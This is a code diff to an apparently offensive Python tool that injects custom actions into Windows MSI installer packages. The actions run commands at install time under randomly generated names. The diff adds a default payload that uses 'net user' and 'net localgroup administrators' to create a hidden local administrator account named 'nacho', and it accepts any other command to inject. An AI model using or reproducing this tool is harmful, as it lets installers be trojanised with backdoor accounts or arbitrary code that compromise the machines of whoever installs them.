@@ -1,10 +1,11 @@
+#!/usr/bin/env python3
+
 from cabarchive import CabArchive, CabFile
 
 import logging
 import argparse
 import shutil
 import os
-import sys
 import uuid
 import warnings
 import subprocess
@@ -13,14 +14,16 @@ import random
 import string
 import csv
 import hashlib
+import pathlib
+import re
 
 if os.name == 'nt':
     warnings.filterwarnings("ignore", category=DeprecationWarning)
     import msilib
 
 ACTION_TYPE_JSCRIPT = 6
-ACTION_TYPE_CMD = 34
-ACTION_TYPE_SHELL = 50
+ACTION_TYPE_FILE = 34
+ACTION_TYPE_EXISTING = 50
 
 def random_name(length=12):
     return ''.join(random.choice(string.ascii_letters) for _ in range(length))
@@ -119,7 +122,8 @@ class MSIPatcherWindows(MSIPatcher):
         rec.SetString(1, name)          # Action
         rec.SetInteger(2, type)         # Type
         rec.SetString(3, source_key)    # Source
-        rec.SetString(4, target)        # Target
+        if target:
+            rec.SetString(4, target)        # Target
         ca.Execute(rec)
         ca.Close()
         db.Commit()
@@ -481,18 +485,19 @@ def get_msi_patcher():
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
-    parser.add_argument('-i', '--input', help='Input MSI file to add custom action to', required=True)
-    parser.add_argument('-o', '--output', help='Output file to write the patched MSI to', required=True)
-    parser.add_argument('-c', '--command', help='Command to inject into MSI', required=False)
-    parser.add_argument('-f', '--force', help="Delete output file if it exists", action='store_true')
-    parser.add_argument('--increment', help="Increment MSI version", action='store_true')
-    parser.add_argument('--add-file', help='Path to file to be added to the MSI', required=False)
-    parser.add_argument('--feature', help='Feature to add the file to', default="auto")
+    parser.add_argument("-i", "--input", help="Input MSI file to add custom action to", required=True)
+    parser.add_argument("-o", "--output", help="Output file to write the patched MSI to", required=True)
+    parser.add_argument("-c", "--command", help="Command to inject into MSI, admin user named nacho is " \
+                        "added if only -c is specified", required=False, nargs='*')
+    parser.add_argument("-f", "--force", help="Delete output file if it exists", action='store_true')
+    parser.add_argument("--increment", help="Increment MSI version", action='store_true')
+    parser.add_argument("--add-file", help="Path to file to be added to the MSI", required=False)
+    parser.add_argument("--feature", help="Feature to add the file to", default="auto")
     args = parser.parse_args()
 
-    sequence = "InstallExecuteSequence"
-    action_type = ACTION_TYPE_SHELL
-    source = "C:\\windows\\system32\\cmd.exe"
+    if not args.add_file and not args.increment and not type(args.command) == list:
+        print("Must specify at least one of --command, --add-file, or --increment")
+        exit(1)
 
     patcher = get_msi_patcher()
 
@@ -505,11 +510,21 @@ if __name__ == '__main__':
 
     shutil.copy(args.input, args.output)
 
-    if args.command:
-        target = args.command
-        if patcher.add_custom_action(args.output, f"_{random_hash()}", action_type, source, target, sequence):
+    if type(args.command) == list:
+        sequence = "InstallExecuteSequence"
+        action_type = ACTION_TYPE_EXISTING
+        if args.command == []:
+            path = "c:\\windows\\system32\\cmd.exe"
+            params = "/c net user nacho nacho /add && net localgroup administrators nacho /add && exit 0"
+        else:
+            segments = pathlib.PureWindowsPath(''.join(args.command)).parts
+            if not re.match("^[a-z]:\\\\$", segments[0], re.IGNORECASE):
+                print("Must specify full path to the command")
+                exit(1)
+            path = segments[0] + '\\'.join(segments[1:-1]) + '\\' + segments[-1].split()[0]
+            params = ' '.join(segments[-1].split()[1:])
+        if patcher.add_custom_action(args.output, f"_{random_hash()}", action_type, path, params, sequence):
             print("Custom action added")
-            modified = True
 
     if args.add_file and patcher.add_file(args.output, args.add_file, random_hash(), args.feature):
         print("File added to MSI")
@@ -518,5 +533,5 @@ if __name__ == '__main__':
         patcher.increment_msi_version(args.output)
         print("MSI version incremented")
 
-    if not args.add_file and not args.command and not args.increment:
-        print("Warning: Writing unmodified MSI as no changes were requested")
+    shutil.rmtree('Binary')
+    shutil.rmtree('Icon')
